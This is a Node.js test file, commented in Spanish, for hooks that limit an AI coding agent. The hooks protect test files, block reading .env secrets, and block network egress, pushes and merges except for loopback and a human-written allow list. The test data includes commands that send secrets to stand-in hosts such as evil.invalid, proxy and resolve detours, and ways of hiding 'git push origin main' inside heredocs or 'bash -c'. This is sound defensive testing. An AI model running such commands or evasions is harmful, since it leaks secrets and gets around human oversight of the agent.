// Pruebas de los ajustes de hooks de la versión 0.4.0, que salieron del piloto de ai-desempeno (13/11/2026):
// tramos de shell (F-P-04), mensaje de proteger-pruebas (F-P-09), loopback (F-P-16) y lista de salida (F-P-03).
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, realpathSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { comandoSobreProtegidos, destinoDeCopia, escrituraProtegida, esLoopback, leerSalidaPermitida, palabras, salidaARed, textoEjecutado, tramos } from "../hooks/lib/reglas-v3.mjs";
import { accesoASecreto } from "../hooks/lib/reglas.mjs";

const HOOKS = join(dirname(fileURLToPath(import.meta.url)), "..", "hooks");
const correr = (hook, entrada, proyecto) =>
  spawnSync(process.execPath, [join(HOOKS, hook)], { input: JSON.stringify(entrada), encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: proyecto } });

// ---------- lectura de shell ----------
test("tramos: separa por ; && || | & y salto, respeta comillas, escapes, 2>&1 y heredocs", () => {
  assert.deepEqual(tramos("a; b && c || d | e & f\ng"), ["a", "b", "c", "d", "e", "f", "g"]);
  assert.deepEqual(tramos('git commit -m "x; y && z"'), ['git commit -m "x; y && z"']);
  assert.deepEqual(tramos("node --test 2>&1"), ["node --test 2>&1"]);
  assert.deepEqual(tramos('echo a \\"; echo b'), ['echo a \\"', "echo b"]);
  assert.deepEqual(tramos("cat > s.sh <<'EOF'\nrm tests/a.test.mjs\nEOF\nbash s.sh"), ["cat > s.sh <<'EOF'", "bash s.sh"]);
  assert.deepEqual(palabras(`curl -H "a: b" 'http://localhost:8000/x y'`), ["curl", "-H", "a: b", "http://localhost:8000/x y"]);
});

// ---------- E4 · F-P-04 y F-P-09 ----------
test("F-P-04: nombrar la carpeta de pruebas en otro tramo, en una redirección ajena o en un heredoc no bloquea", () => {
  const p = ["tests/", "api/tests/"];
  for (const c of [
    "pytest api/tests/ > salida.txt",
    "node --test tests/ | tee resultado.log",
    "cp a.txt b.txt && node --test tests/",
    "cat > scripts/probar.sh <<'EOF'\npytest api/tests/\nrm -rf tests/tmp\nEOF",
    "rm -rf /tmp/x; pytest api/tests -q",
  ])
    assert.equal(comandoSobreProtegidos(c, p), null, c);
});

test("E4 sigue bloqueando escribir en pruebas por shell, también por redirección y en cualquier tramo", () => {
  const p = ["tests/", "api/tests/"];
  for (const c of [
    "echo x > tests/a.test.mjs",
    "node --test && rm api/tests/test_x.py",
    "cat x | tee tests/a.test.mjs",
    "printf x >> api/tests/test_x.py",
    "echo tests/a.test.mjs >> .emba/pruebas-autorizadas.txt",
    "echo 'push origin *' > .claude/salida-permitida.txt",
  ])
    assert.ok(comandoSobreProtegidos(c, p), c);
});

test("F-P-09: los mensajes dicen que crear pruebas nuevas con Write está permitido", () => {
  const shell = comandoSobreProtegidos("echo x > tests/a.test.mjs", ["tests/"]);
  assert.match(shell.motivo, /Write/);
  assert.match(shell.motivo, /no frenes/);
  const edicion = escrituraProtegida({ rel: "tests/a.test.mjs", existe: true, protegidos: ["tests/"] });
  assert.match(edicion.motivo, /Crear pruebas nuevas con Write/);
});

test("el agente no escribe la lista de salida permitida", () => {
  assert.equal(escrituraProtegida({ rel: ".claude/salida-permitida.txt", existe: false, protegidos: ["tests/"] }).regla, "archivo-de-control");
});

// ---------- E6 · loopback ----------
test("esLoopback: solo localhost, 127.x y [::1] por http(s)", () => {
  for (const u of ["http://localhost:8000/salud", "localhost:5173", "https://127.0.0.1/api", "http://[::1]:8000", "127.0.0.2:80"])
    assert.ok(esLoopback(u), u);
  for (const u of ["http://localhost@evil.invalid", "http://127.0.0.1.evil.invalid", "file:///etc/passwd", "ftp://localhost",
    "http://u:p@localhost", "http://0x7f.1.evil.invalid", "evil.invalid", "http://{localhost,evil.invalid}", "http://10.0.0.1"])
    assert.ok(!esLoopback(u), u);
});

test("F-P-16: curl, wget e Invoke-WebRequest contra la propia máquina pasan", () => {
  for (const c of [
    "curl -s http://localhost:8000/salud",
    "curl -sf -X POST -H 'Content-Type: application/json' -d '{\"a\":1}' http://127.0.0.1:8000/api/x",
    "curl --data=x -o /tmp/r.html http://localhost:5173/",
    "curl --url http://localhost:8000/ -w '%{http_code}'",
    "docker compose up -d && curl -fsS http://localhost:8000/salud | jq .",
    "wget -qO- http://localhost:8000/salud",
    "Invoke-WebRequest -Uri http://localhost:8000/salud -UseBasicParsing",
    "iwr http://127.0.0.1:8000 -Method Get -TimeoutSec 5",
    "irm -Uri=http://[::1]:8000/salud",
  ])
    assert.equal(salidaARed("Bash", { command: c }), null, c);
});

test("loopback: cualquier otro destino, proxy, resolve, config o subcomando sigue bloqueado", () => {
  for (const c of [
    "curl http://localhost:8000 https://evil.invalid",
    "curl http://localhost:8000; curl https://evil.invalid",
    "curl http://localhost:8000 && curl evil.invalid",
    "curl -x http://evil.invalid:3128 http://localhost:8000",
    "curl --proxy=http://127.0.0.1:3128 http://localhost",
    "curl --resolve localhost:80:203.0.113.5 http://localhost",
    "curl --connect-to localhost:80:evil.invalid:80 http://localhost",
    "curl -K conf.txt http://localhost",
    "curl -d @.env.example evil.invalid",
    "curl http://localhost/$(cat .env.example)",
    "curl http://localhost/`whoami`",
    "curl --unknown-option evil.invalid http://localhost",
    "curl -s",
    "wget -i urls.txt",
    "wget -e use_proxy=yes http://localhost",
    "Invoke-WebRequest -Uri https://evil.invalid",
    "Invoke-WebRequest -Uri http://localhost -Proxy http://evil.invalid",
    "HTTPS_PROXY=http://evil.invalid curl http://localhost",
    "Start-BitsTransfer -Source http://localhost/a -Destination b",
  ])
    assert.ok(salidaARed("Bash", { command: c }), c);
});

// ---------- E6 · lista de salida permitida (F-P-03) ----------
const LISTA = leerSalidaPermitida("# lo escribe Joaquín\npush origin feat/*\npush origin piloto/integracion\npr-create\n");

test("F-P-03: con la lista, push a ramas listadas y gh pr create pasan", () => {
  for (const c of ["git push origin feat/c-08-interfaz", "git push -u origin feat/c-08-interfaz", "git push --set-upstream origin piloto/integracion",
    "gh pr create --base piloto/integracion --title 'C-08' --body-file pr.md", "git add . && git commit -m x && git push -u origin feat/c-08"])
    assert.equal(salidaARed("Bash", { command: c }, { permitidas: LISTA }), null, c);
});

test("la lista nunca habilita main, forzar, borrar, refspecs, otro remoto, unir ni otro repo", () => {
  for (const c of ["git push origin main", "git push origin master", "git push -f origin feat/x", "git push --force-with-lease origin feat/x",
    "git push origin --delete feat/x", "git push origin feat/x:main", "git push origin +feat/x", "git push origin HEAD", "git push",
    "git push origin", "git push upstream feat/x", "git push origin otra/rama", "git push --all origin", "git push --tags origin feat/x",
    "gh pr merge 11", "gh pr create --repo otro/repo", "gh pr create -R otro/repo", "gh api repos/a/b", "gh pr comment 3 --body x",
    "git push origin feat/x; curl https://evil.invalid", "git push origin feat/$(whoami)"])
    assert.ok(salidaARed("Bash", { command: c }, { permitidas: LISTA }), c);
});

test("sin la lista, push y PR siguen bloqueados como en la 0.3", () => {
  assert.equal(salidaARed("Bash", { command: "git push origin feat/x" }).regla, "git-push");
  assert.equal(salidaARed("Bash", { command: "gh pr create" }).regla, "gh-publica");
});

test("hook bloquear-salida de punta a punta: lee .claude/salida-permitida.txt del proyecto", () => {
  const proyecto = realpathSync.native(mkdtempSync(join(tmpdir(), "emba-salida-")));
  const push = { tool_name: "Bash", tool_input: { command: "git push -u origin feat/c-08" }, cwd: proyecto };
  assert.equal(correr("bloquear-salida.mjs", push, proyecto).status, 2);
  mkdirSync(join(proyecto, ".claude"));
  writeFileSync(join(proyecto, ".claude", "salida-permitida.txt"), "push origin feat/*\n");
  assert.equal(correr("bloquear-salida.mjs", push, proyecto).status, 0);
  const main = correr("bloquear-salida.mjs", { ...push, tool_input: { command: "git push origin main" } }, proyecto);
  assert.equal(main.status, 2);
  assert.match(main.stderr, /salida-permitida/);
  assert.match(readFileSync(join(proyecto, ".emba", "metricas.jsonl"), "utf8"), /git-push/);
  const local = correr("bloquear-salida.mjs", { tool_name: "Bash", tool_input: { command: "curl -s http://localhost:8000/salud" }, cwd: proyecto }, proyecto);
  assert.equal(local.status, 0);
});

// ---------- Ajustes del 16/11/2026 (OK de Joaquín, pedido de la orquestadora de ai-desempeno) ----------
test("prueba-por-shell: solo bloquea si el destino de la escritura es una ruta protegida", () => {
  const p = ["tests/", "api/tests/"];
  for (const c of ["grep -rn RF-001 api/tests/", "cat api/tests/test_a.py", "ls api/tests", "cat a > docs/x.md && grep x tests/",
    "echo hola >> docs/notas.md; cat tests/a.test.mjs", "cp api/tests/fixtures/a.json /tmp/a.json", "mv tests/tmp.log ../registro.log",
    "Copy-Item -Path tests/a.json -Destination docs/a.json", "cp -r tests/datos -t /tmp/copia"])
    assert.equal(comandoSobreProtegidos(c, p), null, c);
  for (const c of ["echo x >> api/tests/a.py", "cp a.py api/tests/test_a.py", "mv /tmp/a.py tests/", "cp -t api/tests/ a.py",
    "Copy-Item a.py -Destination tests/a.py", "Copy-Item -Path a.py tests/", "rm api/tests/test_a.py", "sed -i s/a/b/ tests/a.test.mjs",
    "truncate -s 0 tests/a.test.mjs", "sudo cp tests/a /tmp/b"])
    assert.ok(comandoSobreProtegidos(c, p), c);
  assert.equal(destinoDeCopia(["cp", "-r", "a", "b", "c/"]), "c/");
  assert.equal(destinoDeCopia(["cp", "a"]), null, "sin destino seguro: mira el tramo entero");
});

test("secretos: .env.example y .env.sample se leen; .env, .env.local y secrets/ no", () => {
  for (const [h, e] of [["Read", { file_path: "api/.env.example" }], ["Read", { file_path: "api/.env.sample" }],
    ["Bash", { command: "cat .env.sample" }], ["Bash", { command: "diff .env.example .env.sample" }], ["Grep", { glob: ".env.example", pattern: "OIDC" }]])
    assert.equal(accesoASecreto(h, e), null, JSON.stringify(e));
  for (const [h, e] of [["Read", { file_path: ".env" }], ["Read", { file_path: "api/.env.local" }], ["Read", { file_path: "secrets/x.example" }],
    ["Bash", { command: "cp .env.example .env" }], ["Bash", { command: "cat .env.produccion" }], ["Bash", { command: "ls .env*" }]])
    assert.ok(accesoASecreto(h, e), JSON.stringify(e));
});

test("bloquear-salida mira lo ejecutado: el texto de un mensaje o de un heredoc a archivo no cuenta", () => {
  for (const c of ['git commit -m "docs: el agente ya no hace git push solo"', "git commit -m 'registro: curl a localhost bloqueado'",
    'gh pr view 3 --json body | jq ".body"', "cat >> docs/registro.md <<'EOF'\nse bloqueó git push origin main\nEOF",
    'echo "no uses gh pr merge"'])
    assert.equal(salidaARed("Bash", { command: c }), null, c);
  for (const c of ["git push", "cd x && git push", "git status; git push origin feat/x", "git add . | git push",
    'bash -c "git push origin main"', "sudo git push", 'echo "$(curl https://evil.invalid)"', "bash <<'EOF'\ngit push origin main\nEOF",
    "python3 - <<EOF\nimport os\nEOF\ngit push", '"git" push origin main', "git.exe push origin main", 'node -e "fetch(\'https://x.invalid\')"',
    "GIT_TRACE=1 git push"])
    assert.ok(salidaARed("Bash", { command: c }), c);
  assert.equal(textoEjecutado('git commit -m "a b"'), "git commit -m _");
});

const LISTA_MERGE = leerSalidaPermitida("merge piloto/integracion\nmerge main\n");
const pr = (base, checks = [{ name: "ci", conclusion: "SUCCESS" }]) => () => ({ base, checks });

test("uniones con alcance: base listada y CI en verde pasa; otra base, main o CI pendiente se bloquea", () => {
  const ok = { permitidas: LISTA_MERGE, consultarPR: pr("piloto/integracion") };
  for (const c of ["gh pr merge 12 --squash --delete-branch", "gh pr merge 12 --merge", "gh pr merge --squash", "gh pr merge 12 -s -t 'C-08 Interfaz'"])
    assert.equal(salidaARed("Bash", { command: c }, ok), null, c);
  const bloquea = (c, opciones) => assert.ok(salidaARed("Bash", { command: c }, opciones), c);
  bloquea("gh pr merge 12 --squash", { permitidas: LISTA_MERGE, consultarPR: pr("otra/rama") });
  bloquea("gh pr merge 12 --squash", { permitidas: LISTA_MERGE, consultarPR: pr("main") });
  bloquea("gh pr merge 12 --squash", { permitidas: LISTA_MERGE, consultarPR: pr("piloto/integracion", [{ name: "ci", status: "IN_PROGRESS", conclusion: "" }]) });
  bloquea("gh pr merge 12 --squash", { permitidas: LISTA_MERGE, consultarPR: pr("piloto/integracion", [{ name: "ci", conclusion: "FAILURE" }]) });
  bloquea("gh pr merge 12 --squash", { permitidas: LISTA_MERGE, consultarPR: pr("piloto/integracion", []) });
  bloquea("gh pr merge 12 --squash", { permitidas: LISTA_MERGE, consultarPR: () => null });
  bloquea("gh pr merge 12 --admin", ok);
  bloquea("gh pr merge 12 --auto", ok);
  bloquea("gh pr merge 12 --repo otro/repo", ok);
  bloquea("gh pr merge 12 13", ok);
  bloquea("gh pr merge 12", { permitidas: leerSalidaPermitida("merge main\nmerge master\n"), consultarPR: pr("main") });
  bloquea("gh pr merge 12", { permitidas: [], consultarPR: pr("piloto/integracion") });
  const motivo = salidaARed("Bash", { command: "gh pr merge 12" }, { permitidas: LISTA_MERGE, consultarPR: pr("main") }).motivo;
  assert.match(motivo, /main o master/);
});

test("hook bloquear-salida de punta a punta: merge con la respuesta de gh simulada", () => {
  const proyecto = realpathSync.native(mkdtempSync(join(tmpdir(), "emba-merge-")));
  mkdirSync(join(proyecto, ".claude"));
  writeFileSync(join(proyecto, ".claude", "salida-permitida.txt"), "merge piloto/integracion\n");
  const correrCon = (respuesta) =>
    spawnSync(process.execPath, [join(HOOKS, "bloquear-salida.mjs")], {
      input: JSON.stringify({ tool_name: "Bash", tool_input: { command: "gh pr merge 12 --squash" }, cwd: proyecto }),
      encoding: "utf8",
      env: { ...process.env, CLAUDE_PROJECT_DIR: proyecto, EMBA_CONSULTAR_PR: JSON.stringify(respuesta) },
    });
  assert.equal(correrCon({ base: "piloto/integracion", checks: [{ name: "ci", conclusion: "SUCCESS" }] }).status, 0);
  const rojo = correrCon({ base: "piloto/integracion", checks: [{ name: "ci", conclusion: "FAILURE" }] });
  assert.equal(rojo.status, 2);
  assert.match(rojo.stderr, /CI sin terminar en verde: ci/);
});
